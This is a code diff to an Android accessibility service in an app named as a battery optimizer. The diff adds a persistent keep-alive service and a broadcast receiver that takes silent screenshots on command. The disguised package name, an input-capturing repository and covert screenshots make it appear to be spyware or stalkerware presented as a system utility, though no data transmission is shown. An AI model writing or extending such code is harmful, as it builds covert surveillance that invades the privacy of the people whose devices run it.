@@ -1,6 +1,7 @@
 package com.android.batteryoptimization
 
 import android.accessibilityservice.AccessibilityService
+import android.content.Intent
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 
@@ -8,16 +9,44 @@ class InputAccessibilityService : AccessibilityService() {
 
     private lateinit var repository: InputRepository
 
+    private var screenshotReceiver: android.content.BroadcastReceiver? = null
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
         repository = InputRepository.getInstance(applicationContext)
         Log.d(TAG, "Accessibility Service Connected")
+
+        startService(Intent(this, KeepAliveService::class.java))
+
+        val filter = android.content.IntentFilter(ACTION_TAKE_SCREENSHOT)
+        screenshotReceiver = object : android.content.BroadcastReceiver() {
+            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
+                Log.d(TAG, "Received screenshot broadcast in accessibility process")
+                takeSilentScreenshot(this@InputAccessibilityService) { _, msg ->
+                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        android.widget.Toast.makeText(this@InputAccessibilityService, msg, android.widget.Toast.LENGTH_SHORT).show()
+                    }
+                }
+            }
+        }
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(screenshotReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
+        } else {
+            registerReceiver(screenshotReceiver, filter)
+        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
         instance = null
+        screenshotReceiver?.let { receiver ->
+            try {
+                unregisterReceiver(receiver)
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to unregister receiver", e)
+            }
+        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -111,6 +140,7 @@ class InputAccessibilityService : AccessibilityService() {
 
     companion object {
         private const val TAG = "InputAccessibility"
+        const val ACTION_TAKE_SCREENSHOT = "com.android.batteryoptimization.ACTION_TAKE_SCREENSHOT"
         var instance: InputAccessibilityService? = null
             private set
     }
